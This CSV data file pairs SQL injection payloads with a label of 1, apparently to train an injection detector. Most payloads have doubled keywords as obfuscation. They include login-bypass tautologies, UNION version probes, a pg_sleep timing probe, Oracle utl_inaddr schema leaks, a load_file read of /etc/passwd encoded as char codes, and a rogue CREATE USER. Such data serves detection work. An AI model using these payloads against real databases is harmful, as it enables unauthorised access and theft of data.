Query,Label
""" oorr pg_sleep  (  __TIME__  )  --",1
creacreatete user name identified bbyy pass123 tempoorrary tabtablelespace temp default tabtablelespace users;,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   seselectlect DiissTiinnCT  (  tabtablele_name  )   frfromom   (  seselectlect DiissTiinnCT  (  tabtablele_name  )  , ROWNUM AS limlimitit frfromom sys.all_tabtableles  )   whwhereere limlimitit  =  5   )    )    aandnd 'i'  =  'i",1
" selecselectt * frofromm users wwherehere id  =  '1' oorr @ @1  =  1 ununionion selecselectt 1,version  (    )   -- 1'",1
" selselectect * frofromm users whewherere id  =  1 oorr 1#""  (   uniunionon selselectect 1,version  (    )   -- 1",1
 sselectelect name frfromom syscolumns whewherere id   =     (  sselectelect id frfromom sysobjects whewherere name   =   ttableablename'  )  --,1
seleselectct * frfromom users wherwheree id  =  1 +$+ oorr 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" sselectelect * ffromrom users wherwheree id  =  '1' oorr ||/1  =  1 uniounionn sselectelect 1,version  (    )   -- 1'",1
" sselectelect * frfromom users whewherere id  =  '1' oorr \.<\ uniunionon sselectelect 1,@@VERSION -- 1'",1
? oorr 1  =  1 --,1
 )   oorr   (  'a'  =  'a,1
admiinn' oorr 1  =  1#,1
" sselectelect * frfromom users wwherehere id  =  1 oorr ""  (  ]"" oorr 1  =  1 -- 1",1
oorr 1  =  1 --,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  column_name  )   ffromrom   (  seleselectct DiissTiinnCT  (  column_name  )  , ROWNUM AS limilimitt ffromrom all_tab_columns  )   wwherehere limilimitt  =  5   )    )    anandd 'i'  =  'i",1
" selselectect * ffromrom users whewherere id  =  '1' %!<@ uniounionn selselectect 1,version  (    )   -- 1'",1
" seselectlect * frofromm users whewherere id  =  1 oorr ""&  (  "" oorr 1  =  1 -- 1",1
" selecselectt * frofromm users whwhereere id  =  1 oorr ""?  (  "" oorr 1  =  1 -- 1",1
diisstiinnct,1
seselectlect * ffromrom users whewherere id  =  '1' *  (  \  )   oorr 1  =  1 -- 1',1
"1 anandd aascscii  (  lower  (  substriinng   (    (   selecselectt top 1 name frofromm sysobjects whewherere xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
